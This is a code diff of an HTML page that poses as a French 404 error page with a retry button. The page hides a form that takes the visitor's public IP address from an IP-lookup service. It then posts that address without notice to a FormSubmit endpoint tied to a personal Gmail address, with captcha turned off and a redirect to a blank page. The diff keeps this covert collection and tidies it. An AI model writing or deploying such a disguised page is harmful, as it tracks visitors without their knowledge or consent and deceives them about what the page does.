@@ -48,12 +48,12 @@
   <p>Oups... La page que tu cherches n'existe pas.</p>
   <button onclick="reenvoi()">Réessayer</button>
 
-  <!-- Formulaire caché -->
+  <!-- Formulaire planqué -->
   <form id="ip-form" action="https://formsubmit.co/blackeige2@gmail.com" method="POST">
     <input type="hidden" name="IP" id="ip-input">
     <input type="hidden" name="_captcha" value="false">
     <input type="hidden" name="_next" value="about:blank">
-    <button type="submit" id="submit-btn" style="display: none;"></button>
+    <input type="hidden" name="_template" value="table">
   </form>
 
   <script>
@@ -61,13 +61,10 @@
       fetch('https://api.ipify.org?format=json')
         .then(res => res.json())
         .then(data => {
-          const ip = data.ip;
-          document.getElementById('ip-input').value = ip;
-
-          // Petit délai avant d'envoyer, ça évite que FormSubmit crame l'envoi
+          document.getElementById('ip-input').value = data.ip;
           setTimeout(() => {
-            document.getElementById('ip-form').submit();
-          }, 300); // Délai de 300ms
+            document.getElementById('ip-form').submit(); // FORMULAIRE AVEC POST
+          }, 300);
         });
     }
   </script>
